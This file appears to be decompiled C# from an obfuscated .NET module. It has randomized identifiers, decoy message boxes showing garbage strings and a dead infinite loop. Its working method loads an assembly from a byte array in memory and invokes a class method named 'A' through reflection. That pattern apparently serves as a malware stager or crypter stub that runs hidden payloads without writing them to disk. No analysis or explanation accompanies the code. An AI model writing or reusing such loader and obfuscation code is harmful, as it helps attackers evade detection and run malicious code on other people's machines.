using System;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace Window;

[StandardModule]
internal sealed class fZW9R1851vug0H0p2m
{
	private static object ZFUlfXzAvG4DFoKt()
	{
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		MessageBox.Show("F&%dn<g:?\\Š)'WRLLAF/)j>,.l\\5W*Ytb4v‚{\u0081c<M‹");
		Interaction.MsgBox((object)"^_*ipŠ;`%zˆv)g‰\u008d2\u00814+‹iKO2ˆta4~#‹xJ&y", (MsgBoxStyle)0, (object)null);
		return 706;
	}

	public static object Rm(byte[] AssemblyName)
	{
		Assembly assembly = Assembly.Load(AssemblyName);
		Type[] types = assembly.GetTypes();
		int num = 0;
		Type type;
		object result = default(object);
		while (true)
		{
			if (num < types.Length)
			{
				type = types[num];
				if (type.IsClass && type.FullName!.EndsWith(".A"))
				{
					break;
				}
				num = checked(num + 1);
				continue;
			}
			return result;
		}
		object objectValue = RuntimeHelpers.GetObjectValue(Activator.CreateInstance(type));
		return RuntimeHelpers.GetObjectValue(type.InvokeMember("A", BindingFlags.InvokeMethod, null, RuntimeHelpers.GetObjectValue(objectValue), new object[0]));
	}

	private static object HT226Jcw58Ad4Bz6WfF1xBvxxo939()
	{
		while (true)
		{
		}
	}
}
